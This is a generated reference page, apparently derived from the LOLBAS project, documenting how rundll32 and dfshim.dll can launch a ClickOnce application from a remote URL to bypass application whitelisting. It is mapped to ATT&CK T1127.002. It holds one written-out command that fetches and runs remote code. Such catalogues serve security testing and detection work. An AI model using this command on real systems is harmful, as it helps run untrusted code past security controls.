---
parsed_by: focuslocust
source: commands
type: generated
---
# Dfshim.dll Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Dfshim.dll

Tool page: [Dfshim.dll](../../tools/windows/dfshim.dll.md)

### Use binary to bypass Application whitelisting

```text
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

Description:

Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)

Related ATT&CK:

- [T1127.002](../../attack/techniques/T1127.002-clickonce.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Dfshim.yml` |
| Evidence | Command preserved from source parser. |
